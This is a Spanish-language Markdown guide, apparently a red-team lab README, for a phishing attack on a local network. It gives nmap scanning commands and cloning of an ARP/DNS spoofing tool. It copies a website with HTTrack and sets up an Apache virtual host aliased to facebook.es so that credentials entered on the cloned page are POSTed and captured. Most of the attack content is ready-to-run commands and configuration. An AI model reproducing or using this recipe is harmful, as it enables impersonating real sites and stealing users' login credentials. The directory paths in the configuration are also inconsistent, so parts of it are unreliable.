# Fase de reconocimiento Red Team

## 1. Obtener lista de hosts dentro de la red

* Escanear todos los hosts activos en tu subred
```bash
sudo nmap -sn 10.0.2.0/24           
```
* Escanear los puertos UDP y TCP mas comunes y mostrar los servicios que ellos corren
```bash
sudo nmap -sS -sU -sV -p 20-25,80,443,8080 IP
```

# Fase de preparación Red Team

* Configuración herramienta para realizar el ARP y DNS Spoofing
 ```bash
git clone https://github.com/Maalfer/spoofy.git
```

* Configuración herramienta para copiar la página web original
```bash
#Actualiza los paquetes del sistema:
sudo apt update

#Instala HTTrack
sudo apt install httrack

#Verifica la instalación 
httrack --version

#Sintaxis para copiar página web
httrack <URL_DEL_SITIO> -O <CARPETA_DE_DESTINO> [OPCIONES]
```
* Configuración del servidor malicioso
  
  * 🔧 Requisitos Previos
    - Kali Linux actualizado
    - Acceso de superusuario (`sudo su` o comandos con `sudo`)
    - Conexión a internet para instalar paquetes
      
  * Actualizar Sistema e Instalar Apache
    ```bash
    sudo apt update
    sudo apt upgrade -y
    sudo apt install apache2 -y
    ```
  
  * Iniciar y Habilitar Apache
    ```bash
    sudo systemctl start apache2
    sudo systemctl status apache2  # Verificar que esté activo (running)
    ```

    * Crear directorio para tu sitio web
    ```bash
    sudo mkdir -p /var/www/mi_sitio/public_html
    sudo chown -R $USER:$USER /var/www/mi_sitio/public_html
    sudo chmod -R 755 /var/www/mi_sitio/public_html
    ```
    
    * Crear página web: introduce el index.html creado por httrack en el directorio que creamos 
    anteriormente, modificala para que cuando el usuario introduzca sus credenciales se manden por 
    medio de una petición post y sean tomandas por la herramienta de spoofer
    

   * Configurar Virtual Host para que permita peticiones post y poder robar las credenciales
    ```bash
    sudo nano /etc/apache2/sites-available/mi-sitio.conf

    #Dentro de nano pega:
    <VirtualHost *:80>
        ServerName www.atacante.local
        ServerAlias facebook.es
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/my_sites/public_html

        <Directory "/var/www/my_sites/public_html">
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>

        # --- AQUÍ EMPIEZA LA CONFIGURACIÓN CORREGIDA ---

        # Configuración CORS
        <IfModule mod_headers.c>
            # En la siguiente línea dentro de los "" colocas la url de origen que quieres permitir
            Header set Access-Control-Allow-Origin "" 
            Header set Access-Control-Allow-Methods "GET, POST, OPTIONS"
            Header set Access-Control-Allow-Headers "Content-Type, Authorization"
            Header set Access-Control-Max-Age "86400"
            # Opcional: Caché de la pre-verificación OPTIONS por 24 horas
        </IfModule>

        # Para manejar las peticiones OPTIONS de pre-verificación
        RewriteEngine On
        RewriteCond %{REQUEST_METHOD} OPTIONS
        RewriteRule ^(.*)$ $1 [R=200,L]

        # --- AQUÍ TERMINA LA CONFIGURACIÓN CORREGIDA ---

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    </VirtualHost>
    ```
    
    * Montar servidor
    ```bash
    sudo a2dissite *
    sudo a2ensite mi-sitio.conf
    sudo a2enmod headers
    sudo a2enmod rewrite
    sudo systemctl restart apache2
    sudo systemctl restart apache2
    ```
    * Probar servidor
       -  En la url del navegador coloca la tu ip local y ve si se muestra tu página

# Fase de ataque:

* Usar todas las herramientas para llegar al objetivo
